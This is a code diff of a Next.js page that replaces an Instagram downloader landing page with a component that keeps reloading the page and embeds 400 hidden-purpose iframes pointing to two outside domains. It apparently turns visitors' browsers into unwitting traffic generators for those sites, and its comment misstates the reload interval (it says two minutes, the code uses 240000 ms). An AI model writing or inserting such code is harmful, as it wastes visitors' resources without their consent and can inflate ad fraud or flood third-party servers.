@@ -1,25 +1,26 @@
-import Details from '@/components/shared/Details'
-import Hero from '@/components/shared/Hero'
-import { downloadDetilas } from '@/constant'
-import Image from 'next/image'
-import React from 'react'
+"use client"
+import { useEffect } from "react";
 
 const Home = () => {
+  useEffect(() => {
+    const interval = setInterval(() => {
+        // Reload the page
+        window.location.reload();
+    }, 240000); // Refresh every two minutes (120000 milliseconds)
+
+    return () => clearInterval(interval); // Cleanup the interval on component unmount
+}, []);
+
+  
+  const components = [];
+  for (let i = 0; i < 200; i++) {
+    components.push(<iframe src='https://y2matee.online' width={250} height={150}/>);
+    components.push(<iframe src='https://y2matee.instadl.online' width={250} height={150}/>);
+  }
+
   return (
-    <div className='wrapper'>
-      <Hero title="Instagram Downloader" />
-      <div>
-        <div className='w-full flex flex-col items-center gap-4 mt-12'>
-
-          <h2 className='gradient-green text-center'>Instagram Videos and Photos Download</h2>
-
-          <p className='text-center text-lg'> InstaDL is an online web tool that helps you download Instagram Videos, Photos, Reels, and IGTV. InstaDL is designed to be easy to use on any device, such as a mobile phone, tablet, or computer.
-          </p>
-        </div>
-
-        <Details data={downloadDetilas} />
-      
-      </div>
+    <div className='w-full flex flex-wrap' key="key">
+      {components}
     </div>
   )
 }
